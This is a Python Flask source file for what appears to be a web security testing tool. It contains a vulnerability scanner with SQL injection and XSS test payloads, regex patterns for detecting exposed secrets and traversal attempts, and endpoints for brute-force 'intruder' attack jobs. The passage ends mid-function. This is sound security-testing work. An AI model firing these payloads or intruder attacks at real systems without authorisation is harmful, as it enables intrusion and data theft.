def execute_security_scan(scan_id: str, target_url: str, config: Dict, project: str):
    """Execute comprehensive security scan in background"""
    print(f"[SCAN {scan_id}] Starting security scan for {target_url}")

    try:
        # Initialize scanner
        scanner = AdvancedVulnerabilityScanner()
        findings = []

        # Parse URL components
        parsed_url = urllib.parse.urlparse(target_url)
        scheme = parsed_url.scheme
        host = parsed_url.netloc
        base_path = parsed_url.path

        # Determine scan scope
        scan_type = config.get('scan_type', 'passive')

        if scan_type == 'passive':
            findings = passive_scan_analysis(target_url, scanner, config)
        elif scan_type == 'active':
            findings = active_scan_analysis(target_url, scanner, config)
        elif scan_type == 'crawl_and_audit':
            findings = crawl_and_audit_scan(target_url, scanner, config)
        else:
            findings = comprehensive_scan(target_url, scanner, config)

        # Save findings to database
        if findings:
            with DB.cursor() as cur:
                for finding in findings:
                    finding_id = str(uuid.uuid4())

                    # Calculate CVSS score if not provided
                    cvss_score = finding.get('cvss_score')
                    if not cvss_score:
                        cvss_score = calculate_cvss_score(
                            finding.get('severity', 'Medium'),
                            finding.get('confidence', 'Medium'),
                            finding.get('impact', {})
                        )

                    cur.execute("""INSERT INTO scanner_results 
                                (id, timestamp, issue_type, severity, url, host, path,
                                 description, detail, confidence, remediation, evidence,
                                 request_id, project, cvss_score, cwe_id, scan_id, tags)
                                VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)""",
                                (finding_id, datetime.now(timezone.utc).isoformat(),
                                 finding.get('type', 'Unknown'),
                                 finding.get('severity', 'Medium'),
                                 finding.get('url', target_url),
                                 finding.get('host', host),
                                 finding.get('path', base_path),
                                 finding.get('description', 'No description'),
                                 finding.get('detail', ''),
                                 finding.get('confidence', 'Medium'),
                                 finding.get('remediation', ''),
                                 json.dumps(finding.get('evidence', {})),
                                 finding.get('request_id'),
                                 project,
                                 cvss_score,
                                 finding.get('cwe_id'),
                                 scan_id,
                                 json.dumps(finding.get('tags', []))))

        # Mark scan as completed
        with DB.cursor() as cur:
            cur.execute("""INSERT INTO scanner_results 
                        (id, timestamp, issue_type, severity, url, description,
                         confidence, remediation, evidence, project, scan_id)
                        VALUES (?,?,?,?,?,?,?,?,?,?,?)""",
                        (str(uuid.uuid4()), datetime.now(timezone.utc).isoformat(),
                         "Scan Completed", "Info", target_url,
                         f"Security scan completed for {target_url}. Found {len(findings)} issues.",
                         "High", "N/A", json.dumps({"findings_count": len(findings)}),
                         project, scan_id))

        print(f"[SCAN {scan_id}] Completed with {len(findings)} findings")

    except Exception as e:
        print(f"[SCAN {scan_id}] Error: {e}")
        import traceback
        traceback.print_exc()

        with DB.cursor() as cur:
            cur.execute("""INSERT INTO scanner_results 
                        (id, timestamp, issue_type, severity, url, description,
                         confidence, remediation, evidence, project, scan_id)
                        VALUES (?,?,?,?,?,?,?,?,?,?,?)""",
                        (str(uuid.uuid4()), datetime.now(timezone.utc).isoformat(),
                         "Scan Error", "High", target_url,
                         f"Scan failed with error: {str(e)}",
                         "High", "Review scan configuration", json.dumps({"error": str(e)}),
                         project, scan_id))


def passive_scan_analysis(target_url: str, scanner, config: Dict) -> List[Dict]:
    """Perform passive analysis without sending requests"""
    print(f"[PASSIVE] Analyzing {target_url}")

    findings = []

    # Check URL structure
    parsed_url = urllib.parse.urlparse(target_url)

    # Check for suspicious URL patterns
    url_checks = [
        {
            'pattern': r'(?i)(select|union|insert|delete|update|drop|exec)',
            'type': 'Suspicious URL Pattern',
            'severity': 'Low',
            'description': 'URL contains potentially suspicious SQL keywords'
        },
        {
            'pattern': r'(\.\.\/|\.\.\\)',
            'type': 'Path Traversal Pattern',
            'severity': 'Medium',
            'description': 'URL contains directory traversal patterns'
        },
        {
            'pattern': r'(<script|javascript:|onload=|onerror=)',
            'type': 'XSS Pattern',
            'severity': 'Medium',
            'description': 'URL contains potential XSS patterns'
        }
    ]

    full_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}{'?' + parsed_url.query if parsed_url.query else ''}"

    for check in url_checks:
        if re.search(check['pattern'], full_url, re.IGNORECASE):
            findings.append({
                'type': check['type'],
                'severity': check['severity'],
                'confidence': 'Low',
                'description': check['description'],
                'url': target_url,
                'evidence': {
                    'pattern': check['pattern'],
                    'match': re.search(check['pattern'], full_url, re.IGNORECASE).group()
                },
                'remediation': 'Review URL structure and implement proper input validation'
            })

    # Analyze query parameters
    if parsed_url.query:
        params = urllib.parse.parse_qs(parsed_url.query)

        # Check for sensitive parameter names
        sensitive_params = ['password', 'pass', 'pwd', 'token', 'key', 'secret', 'auth']

        for param_name in params.keys():
            param_lower = param_name.lower()
            for sensitive in sensitive_params:
                if sensitive in param_lower:
                    findings.append({
                        'type': 'Sensitive Data Exposure',
                        'severity': 'Medium',
                        'confidence': 'High',
                        'description': f'Sensitive parameter name detected in URL: {param_name}',
                        'url': target_url,
                        'evidence': {
                            'parameter': param_name,
                            'sensitive_pattern': sensitive
                        },
                        'remediation': 'Do not include sensitive data in URL parameters. Use POST requests with proper encryption.'
                    })
                    break

    return findings


def active_scan_analysis(target_url: str, scanner, config: Dict) -> List[Dict]:
    """Perform active scanning by sending test requests"""
    print(f"[ACTIVE] Scanning {target_url}")

    findings = []

    try:
        # Create requests session
        session = requests.Session()
        session.verify = False  # For testing
        session.timeout = 30

        # Send initial request to analyze
        print(f"[ACTIVE] Sending initial request to {target_url}")
        response = session.get(target_url, allow_redirects=True)

        # Analyze response
        findings.extend(analyze_http_response(target_url, response, scanner))

        # Check for common vulnerabilities based on response
        if config.get('check_sqli', True):
            findings.extend(check_sql_injection(target_url, session, config))

        if config.get('check_xss', True):
            findings.extend(check_xss(target_url, session, config))

        if config.get('check_info_disclosure', True):
            findings.extend(check_information_disclosure(target_url, response, config))

        if config.get('check_misconfig', True):
            findings.extend(check_security_misconfig(target_url, response, config))

    except Exception as e:
        print(f"[ACTIVE] Error scanning {target_url}: {e}")
        findings.append({
            'type': 'Scan Error',
            'severity': 'Low',
            'confidence': 'High',
            'description': f'Error during active scanning: {str(e)}',
            'url': target_url,
            'evidence': {'error': str(e)},
            'remediation': 'Check target availability and network connectivity'
        })

    return findings


def analyze_http_response(url: str, response, scanner) -> List[Dict]:
    """Analyze HTTP response for security issues"""
    findings = []

    # Check security headers
    security_headers = {
        'Strict-Transport-Security': {
            'description': 'Missing HSTS header',
            'severity': 'Medium',
            'remediation': 'Implement HSTS with appropriate max-age'
        },
        'X-Frame-Options': {
            'description': 'Missing X-Frame-Options header',
            'severity': 'Medium',
            'remediation': 'Set X-Frame-Options to DENY or SAMEORIGIN'
        },
        'X-Content-Type-Options': {
            'description': 'Missing X-Content-Type-Options header',
            'severity': 'Low',
            'remediation': 'Set X-Content-Type-Options to nosniff'
        },
        'Content-Security-Policy': {
            'description': 'Missing Content-Security-Policy header',
            'severity': 'Medium',
            'remediation': 'Implement Content Security Policy'
        },
        'X-XSS-Protection': {
            'description': 'Missing X-XSS-Protection header',
            'severity': 'Low',
            'remediation': 'Set X-XSS-Protection header'
        }
    }

    for header, info in security_headers.items():
        if header not in response.headers:
            findings.append({
                'type': 'Security Header Missing',
                'severity': info['severity'],
                'confidence': 'High',
                'description': info['description'],
                'url': url,
                'evidence': {
                    'missing_header': header,
                    'response_headers': dict(response.headers)
                },
                'remediation': info['remediation']
            })

    # Check for sensitive information in response
    response_text = response.text.lower()

    sensitive_patterns = [
        {
            'pattern': r'(password|passwd|pwd)\s*[:=]\s*[\'"][^\'"]*[\'"]',
            'type': 'Password Disclosure',
            'severity': 'High',
            'description': 'Password found in response body'
        },
        {
            'pattern': r'(api[_-]?key|access[_-]?token|secret[_-]?key)\s*[:=]\s*[\'"][^\'"]*[\'"]',
            'type': 'API Key Disclosure',
            'severity': 'High',
            'description': 'API key or access token found in response'
        },
        {
            'pattern': r'(sql syntax.*error|mysql.*error|postgresql.*error)',
            'type': 'Database Error Disclosure',
            'severity': 'Medium',
            'description': 'Database error message revealed'
        },
        {
            'pattern': r'(stack trace|at .*\.java|at .*\.py)',
            'type': 'Stack Trace Disclosure',
            'severity': 'Medium',
            'description': 'Stack trace found in response'
        }
    ]

    for pattern_info in sensitive_patterns:
        matches = re.findall(pattern_info['pattern'], response_text, re.IGNORECASE)
        if matches:
            findings.append({
                'type': pattern_info['type'],
                'severity': pattern_info['severity'],
                'confidence': 'Medium',
                'description': pattern_info['description'],
                'url': url,
                'evidence': {
                    'pattern': pattern_info['pattern'],
                    'matches': matches[:3]  # Limit evidence
                },
                'remediation': 'Implement proper error handling and remove sensitive data from responses'
            })

    # Check for development/debug information
    if any(dev_indicator in response_text for dev_indicator in ['debug', 'development', 'test', 'localhost']):
        findings.append({
            'type': 'Development Information Disclosure',
            'severity': 'Low',
            'confidence': 'Medium',
            'description': 'Development or debug information found in response',
            'url': url,
            'evidence': {
                'indicators': ['debug', 'development', 'test', 'localhost']
            },
            'remediation': 'Remove development information from production responses'
        })

    return findings


def check_sql_injection(url: str, session, config: Dict) -> List[Dict]:
    """Check for SQL injection vulnerabilities"""
    print(f"[SQLi] Testing {url}")

    findings = []

    try:
        # Parse URL to extract parameters
        parsed_url = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed_url.query)

        # SQL injection test payloads
        test_payloads = [
            ("' OR '1'='1", "Basic SQL injection"),
            ("' UNION SELECT NULL--", "Union-based SQLi"),
            ("' AND SLEEP(5)--", "Time-based SQLi"),
            ("' OR 1=1--", "Boolean-based SQLi"),
            ("' OR 'a'='a", "Always true condition")
        ]

        for param_name in params.keys():
            original_value = params[param_name][0]

            for payload, description in test_payloads:
                # Create modified URL with payload
                modified_params = params.copy()
                modified_params[param_name] = [payload]

                new_query = urllib.parse.urlencode(modified_params, doseq=True)
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"

                try:
                    start_time = time.time()
                    response = session.get(test_url, allow_redirects=False)
                    response_time = time.time() - start_time

                    # Check for SQL errors in response
                    response_text = response.text.lower()
                    sql_errors = [
                        'sql syntax', 'mysql', 'postgresql', 'oracle',
                        'sqlite', 'microsoft ole db', 'odbc', 'pdo',
                        'syntax error', 'unclosed quotation'
                    ]

                    if any(error in response_text for error in sql_errors):
                        findings.append({
                            'type': 'SQL Injection',
                            'severity': 'High',
                            'confidence': 'Medium',
                            'description': f'Potential SQL injection in parameter: {param_name}',
                            'detail': f'{description} vulnerability detected',
                            'url': url,
                            'evidence': {
                                'parameter': param_name,
                                'payload': payload,
                                'response_snippet': response_text[:500],
                                'status_code': response.status_code
                            },
                            'remediation': 'Use parameterized queries or prepared statements. Validate and sanitize all user inputs.',
                            'cwe_id': 'CWE-89'
                        })
                        break  # Found vulnerability, move to next parameter

                    # Check for time-based SQLi
                    if 'sleep' in payload.lower() and response_time > 4:
                        findings.append({
                            'type': 'Time-based SQL Injection',
                            'severity': 'High',
                            'confidence': 'Low',
                            'description': f'Potential time-based SQL injection in parameter: {param_name}',
                            'detail': f'Delayed response detected with payload: {payload}',
                            'url': url,
                            'evidence': {
                                'parameter': param_name,
                                'payload': payload,
                                'response_time': response_time,
                                'expected_delay': 5
                            },
                            'remediation': 'Use parameterized queries and implement query timeouts.',
                            'cwe_id': 'CWE-89'
                        })
                        break

                except Exception as e:
                    continue  # Skip failed requests

    except Exception as e:
        print(f"[SQLi] Error: {e}")

    return findings


def check_xss(url: str, session, config: Dict) -> List[Dict]:
    """Check for Cross-Site Scripting vulnerabilities"""
    print(f"[XSS] Testing {url}")

    findings = []

    try:
        # Parse URL to extract parameters
        parsed_url = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed_url.query)

        # XSS test payloads
        test_payloads = [
            ("<script>alert(1)</script>", "Basic script tag"),
            ("\" onload=\"alert(1)", "Event handler"),
            ("javascript:alert(1)", "JavaScript URL"),
            ("<img src=x onerror=alert(1)>", "Image error handler"),
            ("<svg onload=alert(1)>", "SVG event handler")
        ]

        for param_name in params.keys():
            for payload, description in test_payloads:
                # Create modified URL with payload
                modified_params = params.copy()
                modified_params[param_name] = [payload]

                new_query = urllib.parse.urlencode(modified_params, doseq=True)
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"

                try:
                    response = session.get(test_url, allow_redirects=False)
                    response_text = response.text

                    # Check if payload is reflected in response
                    if payload in response_text:
                        # Check if it's properly encoded
                        encoded_payload = html.escape(payload)

                        if encoded_payload not in response_text:
                            findings.append({
                                'type': 'Cross-Site Scripting (XSS)',
                                'severity': 'High',
                                'confidence': 'Medium',
                                'description': f'Reflected XSS in parameter: {param_name}',
                                'detail': f'User input not properly encoded. {description}',
                                'url': url,
                                'evidence': {
                                    'parameter': param_name,
                                    'payload': payload,
                                    'reflected': True,
                                    'response_snippet': response_text[:500]
                                },
                                'remediation': 'Implement proper output encoding. Use Content Security Policy. Validate and sanitize all user inputs.',
                                'cwe_id': 'CWE-79'
                            })
                            break

                except Exception as e:
                    continue

    except Exception as e:
        print(f"[XSS] Error: {e}")

    return findings


def check_information_disclosure(url: str, response, config: Dict) -> List[Dict]:
    """Check for information disclosure vulnerabilities"""
    findings = []

    # Check response headers for information leakage
    headers = response.headers

    # Server information disclosure
    if 'server' in headers:
        server_info = headers['server']
        findings.append({
            'type': 'Information Disclosure',
            'severity': 'Low',
            'confidence': 'High',
            'description': f'Server information disclosed: {server_info}',
            'url': url,
            'evidence': {
                'header': 'Server',
                'value': server_info
            },
            'remediation': 'Remove or obscure server information headers',
            'cwe_id': 'CWE-200'
        })

    # X-Powered-By header
    if 'x-powered-by' in headers:
        findings.append({
            'type': 'Information Disclosure',
            'severity': 'Low',
            'confidence': 'High',
            'description': f'Technology stack disclosed: {headers["x-powered-by"]}',
            'url': url,
            'evidence': {
                'header': 'X-Powered-By',
                'value': headers['x-powered-by']
            },
            'remediation': 'Remove X-Powered-By header',
            'cwe_id': 'CWE-200'
        })

    # Directory listing enabled
    if 'text/html' in headers.get('content-type', '').lower():
        html_content = response.text.lower()

        # Check for directory listing patterns
        dir_listing_patterns = [
            r'<title>index of',
            r'parent directory',
            r'directory listing for',
            r'<a href=".*">.*<\/a>.*\d{2,4}-\w{3}-\d{4}.*\d{2}:\d{2}'
        ]

        for pattern in dir_listing_patterns:
            if re.search(pattern, html_content, re.IGNORECASE):
                findings.append({
                    'type': 'Directory Listing Enabled',
                    'severity': 'Medium',
                    'confidence': 'High',
                    'description': 'Directory listing is enabled',
                    'url': url,
                    'evidence': {
                        'pattern': pattern,
                        'match': re.search(pattern, html_content, re.IGNORECASE).group()
                    },
                    'remediation': 'Disable directory listing in server configuration',
                    'cwe_id': 'CWE-548'
                })
                break

    return findings


def check_security_misconfig(url: str, response, config: Dict) -> List[Dict]:
    """Check for security misconfigurations"""
    findings = []

    headers = response.headers

    # Check for overly permissive CORS
    if 'access-control-allow-origin' in headers:
        if headers['access-control-allow-origin'] == '*':
            if 'access-control-allow-credentials' in headers:
                if headers['access-control-allow-credentials'].lower() == 'true':
                    findings.append({
                        'type': 'Security Misconfiguration',
                        'severity': 'Medium',
                        'confidence': 'High',
                        'description': 'Overly permissive CORS configuration',
                        'detail': 'CORS allows any origin with credentials',
                        'url': url,
                        'evidence': {
                            'access-control-allow-origin': '*',
                            'access-control-allow-credentials': 'true'
                        },
                        'remediation': 'Restrict CORS origins to trusted domains only',
                        'cwe_id': 'CWE-942'
                    })

    # Check for missing security headers (already covered in analyze_http_response)

    return findings


def crawl_and_audit_scan(start_url: str, scanner, config: Dict) -> List[Dict]:
    """Crawl website and audit all discovered pages"""
    print(f"[CRAWL] Starting crawl from {start_url}")

    findings = []
    visited_urls = set()
    urls_to_visit = {start_url}
    max_pages = config.get('max_pages', 50)

    session = requests.Session()
    session.verify = False
    session.timeout = 30

    try:
        parsed_start = urllib.parse.urlparse(start_url)
        base_domain = parsed_start.netloc

        while urls_to_visit and len(visited_urls) < max_pages:
            current_url = urls_to_visit.pop()

            if current_url in visited_urls:
                continue

            visited_urls.add(current_url)
            print(f"[CRAWL] Visiting {current_url} ({len(visited_urls)}/{max_pages})")

            try:
                response = session.get(current_url, allow_redirects=True)

                # Analyze current page
                findings.extend(analyze_http_response(current_url, response, scanner))

                # Extract links for further crawling
                if len(visited_urls) < max_pages:
                    new_links = extract_links_from_html(current_url, response.text, base_domain)
                    urls_to_visit.update(new_links - visited_urls)

            except Exception as e:
                print(f"[CRAWL] Error visiting {current_url}: {e}")
                continue

        print(f"[CRAWL] Completed. Visited {len(visited_urls)} pages, found {len(findings)} issues")

    except Exception as e:
        print(f"[CRAWL] Crawl error: {e}")

    return findings


def comprehensive_scan(url: str, scanner, config: Dict) -> List[Dict]:
    """Perform comprehensive security scan"""
    print(f"[COMPREHENSIVE] Starting comprehensive scan for {url}")

    findings = []

    # Combine multiple scan types
    findings.extend(passive_scan_analysis(url, scanner, config))
    findings.extend(active_scan_analysis(url, scanner, config))

    # Additional comprehensive checks
    try:
        session = requests.Session()
        response = session.get(url, allow_redirects=True)

        # Check for HTTP to HTTPS redirect
        if url.startswith('http://'):
            https_url = url.replace('http://', 'https://')
            try:
                https_response = session.get(https_url, allow_redirects=False)
                if https_response.status_code < 400:
                    findings.append({
                        'type': 'Security Best Practice',
                        'severity': 'Low',
                        'confidence': 'High',
                        'description': 'HTTPS available but not enforced',
                        'url': url,
                        'evidence': {
                            'http_url': url,
                            'https_url': https_url,
                            'https_status': https_response.status_code
                        },
                        'remediation': 'Enforce HTTPS with HSTS header',
                        'cwe_id': 'CWE-319'
                    })
            except:
                pass

    except Exception as e:
        print(f"[COMPREHENSIVE] Error: {e}")

    return findings


def extract_links_from_html(base_url: str, html_content: str, base_domain: str) -> Set[str]:
    """Extract links from HTML content"""
    links = set()

    try:
        # Simple regex-based link extraction
        pattern = r'href=[\'"]?([^\'" >]+)'
        matches = re.findall(pattern, html_content, re.IGNORECASE)

        for match in matches:
            # Resolve relative URLs
            try:
                full_url = urllib.parse.urljoin(base_url, match)
                parsed = urllib.parse.urlparse(full_url)

                # Only include same-domain links
                if parsed.netloc == base_domain:
                    # Remove fragments
                    clean_url = urllib.parse.urlunparse((
                        parsed.scheme,
                        parsed.netloc,
                        parsed.path,
                        parsed.params,
                        parsed.query,
                        ''
                    ))
                    links.add(clean_url)
            except:
                continue

    except Exception as e:
        print(f"[EXTRACT] Error extracting links: {e}")

    return links


def calculate_cvss_score(severity: str, confidence: str, impact: Dict = None) -> float:
    """Calculate CVSS score based on severity and confidence"""
    base_scores = {
        'Critical': 9.0,
        'High': 7.0,
        'Medium': 4.0,
        'Low': 2.0,
        'Info': 0.0
    }

    confidence_multipliers = {
        'High': 1.0,
        'Medium': 0.7,
        'Low': 0.4
    }

    base_score = base_scores.get(severity, 4.0)
    confidence_mult = confidence_multipliers.get(confidence, 0.7)

    cvss_score = base_score * confidence_mult

    # Apply impact adjustments if provided
    if impact:
        if impact.get('data_loss', False):
            cvss_score = min(10.0, cvss_score + 1.0)
        if impact.get('system_compromise', False):
            cvss_score = min(10.0, cvss_score + 2.0)

    return round(cvss_score, 1)


def estimate_scan_time(scan_type: str, depth: str) -> str:
    """Estimate scan time based on type and depth"""
    estimates = {
        'passive': {
            'quick': '1-2 minutes',
            'medium': '2-5 minutes',
            'deep': '5-10 minutes'
        },
        'active': {
            'quick': '5-10 minutes',
            'medium': '10-30 minutes',
            'deep': '30-60 minutes'
        },
        'crawl_and_audit': {
            'quick': '10-20 minutes',
            'medium': '20-60 minutes',
            'deep': '1-2 hours'
        },
        'comprehensive': {
            'quick': '15-30 minutes',
            'medium': '30-90 minutes',
            'deep': '2-4 hours'
        }
    }

    return estimates.get(scan_type, {}).get(depth, '5-10 minutes')




@app.route("/api/scanner/cancel/<scan_id>", methods=["POST"])
def api_scanner_cancel(scan_id: str):
    """Cancel a running scan"""
    try:
        with DB.cursor() as cur:
            cur.execute("""INSERT INTO scanner_results 
                        (id, timestamp, issue_type, severity, url, description,
                         confidence, remediation, evidence, project, scan_id)
                        VALUES (?,?,?,?,?,?,?,?,?,?,?)""",
                        (str(uuid.uuid4()), datetime.now(timezone.utc).isoformat(),
                         "Scan Cancelled", "Info", "N/A",
                         f"Scan {scan_id} was cancelled by user",
                         "High", "N/A", json.dumps({"action": "cancelled"}),
                         GLOBAL.active_project['name'], scan_id))

        return jsonify({
            'success': True,
            'scan_id': scan_id,
            'message': 'Scan cancellation requested'
        })

    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500


@app.route("/api/intruder/jobs")
def api_intruder_jobs():
    """Get intruder jobs"""
    with DB.cursor() as cur:
        rows = cur.execute("""
            SELECT id, timestamp, name, status, target_url, payload_type,
                   payload_count, progress, attack_type
            FROM intruder_jobs 
            WHERE project=?
            ORDER BY datetime(timestamp) DESC 
            LIMIT 50
        """, (GLOBAL.active_project['name'],)).fetchall()

        jobs = []
        for row in rows:
            jobs.append({
                "id": row[0],
                "timestamp": row[1],
                "name": row[2],
                "status": row[3],
                "target_url": row[4],
                "payload_type": row[5],
                "payload_count": row[6],
                "progress": row[7],
                "attack_type": row[8]
            })

    return jsonify(jobs)


@app.route("/api/intruder/start", methods=["POST"])
def api_intruder_start():
    """Start intruder attack"""
    data = request.json

    job_config = {
        'name': data.get('name', 'Attack'),
        'target_url': data.get('target_url'),
        'method': data.get('method', 'GET'),
        'headers': data.get('headers', []),
        'body_template': data.get('body_template', ''),
        'payload_type': data.get('payload_type', 'Custom'),
        'payloads': data.get('payloads', []),
        'attack_type': data.get('attack_type', 'sniper'),
        'grep_strings': data.get('grep_strings', []),
        'extract_grep': data.get('extract_grep', [])
    }

    job_id = intruder_engine.create_job(job_config)
    intruder_engine.start_job(job_id)

    return jsonify({"job_id": job_id})


@app.route("/api/intruder/job/<job_id>")
def api_intruder_job_detail(job_id):
    """Get detailed intruder job information with statistics and analysis"""
    try:
        # First check if job is in active cache for real-time updates
        #intruder_engine = intruder_engine  # Use the global instance


        # Try to get from cache first (for real-time updates)
        with intruder_engine.lock:
            cached_job = intruder_engine.active_jobs.get(job_id)

        if cached_job:
            # Return from cache with real-time data
            return jsonify(create_job_response(cached_job, from_cache=True))

        # If not in cache, load from database
        with DB.cursor() as cur:
            row = cur.execute("""
                SELECT id, timestamp, name, status, target_url, method, headers,
                       body_template, payload_type, payloads, results, attack_type,
                       grep_strings, extract_grep, progress, updated, payload_count
                FROM intruder_jobs 
                WHERE id=?
            """, (job_id,)).fetchone()

            if not row:
                return jsonify({
                    "success": False,
                    "error": "Job not found",
                    "job_id": job_id
                }), 404

            # Parse job data
            job_data = {
                'id': row[0],
                'timestamp': row[1],
                'name': row[2],
                'status': row[3],
                'target_url': row[4],
                'method': row[5],
                'headers': json.loads(row[6]) if row[6] else [],
                'body_template': row[7],
                'payload_type': row[8],
                'payloads': json.loads(row[9]) if row[9] else [],
                'results': json.loads(row[10]) if row[10] else [],
                'attack_type': row[11],
                'grep_strings': json.loads(row[12]) if row[12] else [],
                'extract_grep': json.loads(row[13]) if row[13] else [],
                'progress': float(row[14]) if row[14] is not None else 0.0,
                'updated': row[15],
                'payload_count': row[16] or 0
            }

            # Create comprehensive response
            response = create_job_response(job_data, from_cache=False)
            return jsonify(response)

    except Exception as e:
        print(f"Error getting job details: {e}")
        return jsonify({
            "success": False,
            "error": "Failed to retrieve job details",
            "message": str(e)
        }), 500


def create_job_response(job_data: Dict, from_cache: bool = False) -> Dict:
    """Create comprehensive job response with statistics and analysis"""

    # Calculate statistics
    results = job_data.get('results', [])
    total_requests = len(results)

    # Count status codes
    status_counts = {}
    response_times = []
    response_sizes = []

    successful_requests = 0
    failed_requests = 0

    for result in results:
        status_code = result.get('status_code', 0)
        status_counts[status_code] = status_counts.get(status_code, 0) + 1

        response_time = result.get('response_time', 0)
        if response_time:
            response_times.append(response_time)

        response_size = result.get('length', 0)
        response_sizes.append(response_size)

        if 200 <= status_code < 400:
            successful_requests += 1
        elif status_code >= 400:
            failed_requests += 1

    # Calculate statistics
    avg_response_time = statistics.mean(response_times) if response_times else 0
    avg_response_size = statistics.mean(response_sizes) if response_sizes else 0
    min_response_time = min(response_times) if response_times else 0
    max_response_time = max(response_times) if response_times else 0

    # Analyze grep matches
    grep_matches = {}
    extracted_data = []

    for result in results:
        analysis = result.get('analysis', {})

        # Collect grep matches
        for match in analysis.get('grep_matches', []):
            grep_matches[match] = grep_matches.get(match, 0) + 1

        # Collect extracted data
        extracted_data.extend(analysis.get('extracted', []))

    # Analyze payload effectiveness
    payload_analysis = analyze_payload_effectiveness(results, job_data.get('payloads', []))

    # Identify interesting results
    interesting_results = identify_interesting_results(results, job_data)

    # Parse target URL
    parsed_url = urllib.parse.urlparse(job_data['target_url'])
    host = parsed_url.netloc
    path = parsed_url.path
    query = parsed_url.query

    # Build comprehensive response
    response = {
        "success": True,
        "job": {
            "id": job_data['id'],
            "name": job_data['name'],
            "timestamp": job_data['timestamp'],
            "updated": job_data.get('updated', job_data['timestamp']),
            "status": job_data['status'],
            "progress": job_data['progress'],
            "from_cache": from_cache,

            "configuration": {
                "target": {
                    "url": job_data['target_url'],
                    "host": host,
                    "path": path,
                    "query": query,
                    "method": job_data['method']
                },
                "attack_type": job_data['attack_type'],
                "payload_type": job_data['payload_type'],
                "headers": job_data['headers'],
                "body_template": job_data['body_template'],
                "grep_strings": job_data['grep_strings'],
                "extract_patterns": job_data['extract_grep']
            },

            "statistics": {
                "requests": {
                    "total": job_data.get('payload_count', total_requests),
                    "sent": total_requests,
                    "successful": successful_requests,
                    "failed": failed_requests,
                    "pending": max(0, job_data.get('payload_count', total_requests) - total_requests)
                },
                "timing": {
                    "average_response_time": round(avg_response_time * 1000, 2),  # Convert to ms
                    "min_response_time": round(min_response_time * 1000, 2) if min_response_time else 0,
                    "max_response_time": round(max_response_time * 1000, 2) if max_response_time else 0,
                    "total_time_estimate": round(avg_response_time * job_data.get('payload_count', total_requests), 2)
                },
                "size": {
                    "average_response_size": int(avg_response_size),
                    "total_data_transferred": sum(response_sizes)
                },
                "status_codes": [
                    {"code": code, "count": count}
                    for code, count in sorted(status_counts.items())
                ]
            },

            "analysis": {
                "grep_matches": [
                    {"string": match, "count": count}
                    for match, count in sorted(grep_matches.items(), key=lambda x: x[1], reverse=True)
                ],
                "extracted_data": extracted_data[:50],  # Limit to first 50 items
                "payload_effectiveness": payload_analysis,
                "interesting_results_count": len(interesting_results)
            },

            "payloads": {
                "total": len(job_data.get('payloads', [])),
                "list": job_data.get('payloads', []),
                "preview": job_data.get('payloads', [])[:20]  # First 20 payloads
            },

            "results": {
                "total": len(results),
                "preview": format_results_preview(results[:10]),  # First 10 results
                "interesting": interesting_results[:5]  # Top 5 interesting results
            }
        }
    }

    # Add attack-specific information
    if job_data['attack_type'] == 'sniper':
        response["job"]["configuration"]["attack_info"] = {
            "type": "Sniper",
            "description": "Single payload set, one position at a time",
            "positions": count_payload_positions(job_data['target_url'], job_data['body_template'])
        }
    elif job_data['attack_type'] == 'battering_ram':
        response["job"]["configuration"]["attack_info"] = {
            "type": "Battering Ram",
            "description": "Single payload set, all positions get same payload",
            "positions": count_payload_positions(job_data['target_url'], job_data['body_template'])
        }
    elif job_data['attack_type'] == 'pitchfork':
        response["job"]["configuration"]["attack_info"] = {
            "type": "Pitchfork",
            "description": "Multiple payload sets, synchronized iteration",
            "payload_sets": len(job_data.get('payloads', [])) if isinstance(job_data.get('payloads', []), list) else 1
        }
    elif job_data['attack_type'] == 'cluster_bomb':
        response["job"]["configuration"]["attack_info"] = {
            "type": "Cluster Bomb",
            "description": "Multiple payload sets, cartesian product",
            "payload_sets": len(job_data.get('payloads', [])) if isinstance(job_data.get('payloads', []), list) else 1,
            "total_combinations": calculate_total_combinations(job_data.get('payloads', []))
        }

    return response


def analyze_payload_effectiveness(results: List[Dict], payloads: List) -> Dict:
    """Analyze payload effectiveness based on results"""
    analysis = {
        "most_successful": [],
        "most_interesting": [],
        "error_patterns": []
    }

    if not results or not payloads:
        return analysis

    # Group results by payload
    payload_results = {}
    for i, result in enumerate(results):
        if i < len(payloads):
            payload = payloads[i]
            payload_results.setdefault(payload, []).append(result)

    # Find most successful payloads (based on status code)
    success_rates = []
    for payload, presults in payload_results.items():
        successful = sum(1 for r in presults if 200 <= r.get('status_code', 0) < 400)
        total = len(presults)
        success_rate = (successful / total * 100) if total > 0 else 0

        if total >= 3:  # Only consider payloads with enough requests
            success_rates.append({
                "payload": payload[:100] + ("..." if len(payload) > 100 else ""),  # Truncate long payloads
                "success_rate": round(success_rate, 1),
                "requests": total,
                "average_response_time": statistics.mean(
                    [r.get('response_time', 0) for r in presults]) if presults else 0
            })

    # Sort by success rate
    success_rates.sort(key=lambda x: x["success_rate"], reverse=True)
    analysis["most_successful"] = success_rates[:5]

    # Find payloads with interesting responses
    interesting_payloads = []
    for payload, presults in payload_results.items():
        interesting_count = sum(1 for r in presults if is_interesting_response(r))

        if interesting_count > 0:
            interesting_payloads.append({
                "payload": payload[:100] + ("..." if len(payload) > 100 else ""),
                "interesting_responses": interesting_count,
                "total_responses": len(presults),
                "sample_status_codes": [r.get('status_code', 0) for r in presults[:3]]
            })

    interesting_payloads.sort(key=lambda x: x["interesting_responses"], reverse=True)
    analysis["most_interesting"] = interesting_payloads[:5]

    # Find error patterns
    error_payloads = []
    for payload, presults in payload_results.items():
        error_count = sum(1 for r in presults if r.get('status_code', 0) >= 500)

        if error_count > 0:
            error_payloads.append({
                "payload": payload[:100] + ("..." if len(payload) > 100 else ""),
                "server_errors": error_count,
                "total_responses": len(presults)
            })

    analysis["error_patterns"] = error_payloads[:5]

    return analysis


def is_interesting_response(result: Dict) -> bool:
    """Determine if a response is interesting based on various criteria"""

    # Check status code
    status_code = result.get('status_code', 0)
    if status_code in [401, 403, 500, 502, 503]:
        return True

    # Check response time
